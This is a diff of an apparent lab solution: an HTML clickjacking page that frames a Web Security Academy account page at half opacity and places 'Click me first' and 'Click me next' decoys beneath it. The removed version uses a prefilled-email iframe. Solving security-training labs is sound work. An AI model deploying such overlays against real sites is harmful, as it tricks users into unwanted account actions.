@@ -1,18 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Document</title>
+</head>
 <style>
 	#target_website {
-	position: relative;
-	width: 300px;
-	height: 600px;
-	opacity: 0.5;
-	z-index: 2;
-	border: none;
-	}
-	#decoy_website {
-	position: absolute;
-	top: 470px;
-	left: 125px;
-	z-index: 1;
-	}
-	</style>
-	<div id="decoy_website">Click me</div>
-	<iframe id="target_website" sandbox="allow-forms" src="https://0a34008903c6b0538075bc0300c90053.web-security-academy.net/my-account?email=wiener0%40normal-user.net" scrolling="no"></iframe>
+		position: relative;
+		width: 800px;
+		height: 850px;
+		opacity: 0.5;
+		z-index: 2;
+		}
+	#decoy_website1 {
+		position: absolute;
+		z-index: 1;
+		top: 495px;
+		left: 53px;
+		}
+	#decoy_website2 {
+		position: absolute;
+		z-index: 1;
+		top: 290px;
+		left: 213px;
+		}
+</style>
+<body>
+	<div id="decoy_website2">
+		Click me next
+	</div>
+	<div id="decoy_website1">
+	Click Me first
+	</div>
+	<iframe scrolling="no" id="target_website" src="https://0a23006403a940a3807fd58500f0002b.web-security-academy.net/my-account" >
+	</iframe>	
+</body>
+</html>
